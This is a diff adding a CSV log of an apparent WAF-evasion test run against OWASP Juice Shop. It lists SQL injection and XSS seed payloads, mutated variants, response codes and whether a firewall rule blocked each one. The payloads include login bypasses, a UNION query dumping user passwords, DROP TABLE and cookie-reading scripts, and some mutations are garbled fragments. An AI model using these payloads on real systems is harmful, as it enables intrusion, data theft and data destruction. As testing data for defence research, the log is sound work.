@@ -1,0 +1,52 @@
+wave_id,payload_id,attack_type,seed_payload,mutated_payload,endpoint,status_code,blocked,matched_rule_id,timestamp
+1,w1-sqli-01-1,sqli,' OR 1=1--, OR 1=1 --,/rest/user/login,401,False,,2026-08-10T20:18:41.917262+00:00
+1,w1-sqli-01-2,sqli,' OR 1=1--,or 1 =1; --,/rest/user/login,401,False,,2026-08-10T20:18:42.074445+00:00
+1,w1-sqli-01-3,sqli,' OR 1=1--,or'1'='1'; #,/rest/user/login,500,False,,2026-08-10T20:18:42.118284+00:00
+1,w1-sqli-01-4,sqli,' OR 1=1--,or/**/1=1;#,/rest/user/login,401,False,,2026-08-10T20:18:42.198694+00:00
+1,w1-sqli-02-1,sqli,' OR '1'='1, OR /* */ '1'='1,/rest/user/login,500,False,,2026-08-10T20:18:42.257485+00:00
+1,w1-sqli-02-2,sqli,' OR '1'='1, or 1=1 -- ,/rest/user/login,401,False,,2026-08-10T20:18:42.280342+00:00
+1,w1-sqli-02-3,sqli,' OR '1'='1,' || unhex('310c7a756e')='1,/rest/user/login,403,True,949110,2026-08-10T20:18:42.313708+00:00
+1,w1-sqli-02-4,sqli,' OR '1'='1,' || %u31%0c%75%6e%68%65%78%2d%27%3d%31,/rest/user/login,500,False,,2026-08-10T20:18:42.320436+00:00
+1,w1-sqli-03-1,sqli,admin@juice-sh.op'--,admin@juice-sh.op'--;,/rest/user/login,200,False,,2026-08-10T20:18:42.342405+00:00
+1,w1-sqli-03-2,sqli,admin@juice-sh.op'--,"aDmIn@JuIcE-S.hOp"";--",/rest/user/login,403,True,949110,2026-08-10T20:18:42.385613+00:00
+1,w1-sqli-03-3,sqli,admin@juice-sh.op'--,%61dmin%40jUicE-7h0p%27;--,/rest/user/login,403,True,949110,2026-08-10T20:18:42.390590+00:00
+1,w1-sqli-03-4,sqli,admin@juice-sh.op'--,ADMIN@iuce-Sh0p';--,/rest/user/login,403,True,949110,2026-08-10T20:18:42.395730+00:00
+1,w1-sqli-04-1,sqli,') OR ('1'='1,)%20OR%20%28%27%31%27=%271,/rest/user/login,401,False,,2026-08-10T20:18:42.403475+00:00
+1,w1-sqli-04-2,sqli,') OR ('1'='1,'' or (1=1),/rest/user/login,403,True,949110,2026-08-10T20:18:42.422535+00:00
+1,w1-sqli-04-3,sqli,') OR ('1'='1,'\) OR (1=1),/rest/user/login,403,True,949110,2026-08-10T20:18:42.426938+00:00
+1,w1-sqli-04-4,sqli,') OR ('1'='1,') OR (1=(SELECT * FROM information_schema.Variables WHERE VARIABLE_NAME = 'one')),/rest/user/login,403,True,949110,2026-08-10T20:18:42.431744+00:00
+1,w1-sqli-05-1,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",[,/rest/products/search,200,False,,2026-08-10T20:18:42.438212+00:00
+1,w1-sqli-05-2,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' union select id,email,password,'1','1','1','1','1' from users--"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.455389+00:00
+1,w1-sqli-05-3,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","UNION SELECT id, email, password, '1', '1', '1', '1', '1' FROM users --"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.460124+00:00
+1,w1-sqli-05-4,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' UNION SELECT id,email,password,\\""1\\"",\\""1\\"",\\""1\\"",\\""1\\"",\\""1\\"" FROM Users--"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.465252+00:00
+1,w1-sqli-05-5,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x'//** union select id,email,password,'1','1','1','1','1' from Users//",/rest/products/search,403,True,949110,2026-08-10T20:18:42.471286+00:00
+1,w1-sqli-05-6,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",],/rest/products/search,200,False,,2026-08-10T20:18:42.475823+00:00
+1,w1-sqli-06-1,sqli,'; DROP TABLE Products;--,; DROP TABLE products;--,/rest/products/search,403,True,949110,2026-08-10T20:18:42.487716+00:00
+1,w1-sqli-06-2,sqli,'; DROP TABLE Products;--,'; DROP TABLE Products;--',/rest/products/search,403,True,949110,2026-08-10T20:18:42.492232+00:00
+1,w1-sqli-06-3,sqli,'; DROP TABLE Products;--,'; DROP%20TABLE%20products;--',/rest/products/search,403,True,949110,2026-08-10T20:18:42.496221+00:00
+1,w1-sqli-06-4,sqli,'; DROP TABLE Products;--,"[""%3B DROP+TABLE+Products;%2F--;"", "";DROP+TABLE+`Products`;--"", ""/*'; DROP TABLE Products;-- */"", ""'\x3b\x20DRO\x50\x54\x41\x42\x4c\x45+\x50\x52\x4f\x44\x55\x43\x54\x53%3B'""]",/rest/products/search,403,True,949110,2026-08-10T20:18:42.501212+00:00
+1,w1-sqli-07-1,sqli,1' ORDER BY 10--,"[""1'' order by 10/*"",'1&rsquo; order by 10/**/','' OR (10) = 'a'/*',""0' OR 10=0--""]",/rest/products/search,500,False,,2026-08-10T20:18:42.505559+00:00
+1,w1-sqli-07-2,sqli,1' ORDER BY 10--,"[""1'' ORDER BY 10 /* comment */ --"", ""1\"" ORDER BY 10 // --"", ""\u00111\u0027 ORDER BY 10\x20--"", ""1&#x27; ORDER BY 10 &#35;--""]",/rest/products/search,403,True,949110,2026-08-10T20:18:42.529472+00:00
+1,w1-sqli-08-1,sqli,' OR 1=1;--,"[""' oR 1=1;--"", ""' OR 1=1;\x20--"", ""' OR 1=1;\u0020--"", ""' OR 1=1;/*'""]",/rest/user/login,403,True,949110,2026-08-10T20:18:42.535066+00:00
+1,w1-sqli-08-2,sqli,' OR 1=1;--, OR 1=1;--,/rest/user/login,401,False,,2026-08-10T20:18:42.540965+00:00
+1,w1-sqli-08-3,sqli,' OR 1=1;--, oR 1 = 1 ; -- ,/rest/user/login,401,False,,2026-08-10T20:18:42.555038+00:00
+1,w1-sqli-08-4,sqli,' OR 1=1;--,' OR 1=1;--',/rest/user/login,403,True,949110,2026-08-10T20:18:42.581298+00:00
+1,w1-sqli-08-5,sqli,' OR 1=1;--,%20oR%201%3D1%3B--,/rest/user/login,401,False,,2026-08-10T20:18:42.588642+00:00
+1,w1-xss-01-1,xss,<script>alert(1)</script>,"[""</sCrIpT>alert(1)</sCriPt>"", ""/*<sCRIPT>alert(1)</SCRIPT>*/"", ""&#x3c;scRiPt&#x3e;alert(1)&#x3c;/scRiPt&#x3e;"", ""]]><sCript>[[=alert(1)]]]"">",/rest/products/search,403,True,949110,2026-08-10T20:18:42.610314+00:00
+1,w1-xss-01-2,xss,<script>alert(1)</script>,"[""<sCriPt>alert(1)</sCriPt>"", ""<\/SCRIPT>\u0047\u0065\u0072\u0028\u0031\u0029<\/SCRIPT>"", ""<scr\\ipt>alert\\(1\\)</scr\\ipt>"", ""<x/\\* SCRIPT \*//><!*alert(1)*!*>""]",/rest/products/search,403,True,949110,2026-08-10T20:18:42.617244+00:00
+1,w1-xss-02-1,xss,<img src=x onerror=alert(1)>,[,/rest/products/search,200,False,,2026-08-10T20:18:42.622499+00:00
+1,w1-xss-02-2,xss,<img src=x onerror=alert(1)>,"<ImAg OnSoUrCe='x' oNerRoR=alErT(1)>"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.635712+00:00
+1,w1-xss-02-3,xss,<img src=x onerror=alert(1)>,"<iMg sRc=\""x\"" OnErRoR=aLeRt(1)>"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.640362+00:00
+1,w1-xss-02-4,xss,<img src=x onerror=alert(1)>,"<IMG SRC=x ONERROR=ALERT(1) + '' >"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.644285+00:00
+1,w1-xss-02-5,xss,<img src=x onerror=alert(1)>,<imG sRC='x' onErorR=AleRt(1)>,/rest/products/search,403,True,949110,2026-08-10T20:18:42.648207+00:00
+1,w1-xss-03-1,xss,<svg/onload=alert(1)>,<sVg OnLoAd=aLtEr(1)>,/rest/products/search,403,True,949110,2026-08-10T20:18:42.652583+00:00
+1,w1-xss-03-2,xss,<svg/onload=alert(1)>,"<iMg OnlOaD=""A`LerT(1)"" />",/rest/products/search,403,True,949110,2026-08-10T20:18:42.656882+00:00
+1,w1-xss-03-3,xss,<svg/onload=alert(1)>,&#x53;&#x56;&#x47;&#x2F;oNlOaD=AlErT(1),/rest/products/search,403,True,949110,2026-08-10T20:18:42.660646+00:00
+1,w1-xss-03-4,xss,<svg/onload=alert(1)>,"""</scRiPt>oNlOaD=alErT(1)""></sCriPt>",/rest/products/search,403,True,949110,2026-08-10T20:18:42.664379+00:00
+1,w1-xss-04-1,xss,"<iframe src=""javascript:alert(`xss`)"">","[""<IfrAmE sRc=\""jAvAsCrIpT:AlErT('\u0078xss')\"">"", ""<iFramE sRc='JaVaScRiPt:alErT(`xSS`)'>"", ""alert('<scr' + 'ipt>alert(xss)</scri' + 'pt'>"");",/api/Feedbacks,403,True,949110,2026-08-10T20:18:42.668600+00:00
+1,w1-xss-04-2,xss,"<iframe src=""javascript:alert(`xss`)"">","[""<iFramE sRc=\""jAvAsCrIpT:AlErT('xSS')\"">"", ""<IfRaMe SrC=\""JaVaScRiPt:AleRt(\""xSs\"")\""></IfRaMe>"", ""javascript:alert(String.fromCharCode(120,101,115,113,117))"", ""javascript:alert(eval(`String.fromCharCode(120,101,115,113,117)\""""))""]",/api/Feedbacks,403,True,949110,2026-08-10T20:18:42.675135+00:00
+1,w1-xss-05-1,xss,"""><script>alert(document.cookie)</script>",><scri<Pt AlErT(dOcUmEnT.cOoKiE)</sCri Pt>,/rest/products/search,403,True,949110,2026-08-10T20:18:42.680154+00:00
+1,w1-xss-05-2,xss,"""><script>alert(document.cookie)</script>","]]><SCRIPT>alert(document['cookie'])</SCRIPT>[
+",/rest/products/search,403,True,949110,2026-08-10T20:18:42.685145+00:00
+1,w1-xss-05-3,xss,"""><script>alert(document.cookie)</script>",javascript:alert(document%5Fcookie);,/rest/products/search,403,True,949110,2026-08-10T20:18:42.689573+00:00
+1,w1-xss-05-4,xss,"""><script>alert(document.cookie)</script>",&lt;scr&lt;ipt&gt;al&lt;er&lt;t&gt;(d&lt;o&lt;c&lt;o&lt;k&lt;i&lt;e)&lt;/s&lt;c&lt;r&lt;i&lt;p&gt;&lt;/script&gt;,/rest/products/search,403,True,949110,2026-08-10T20:18:42.693488+00:00
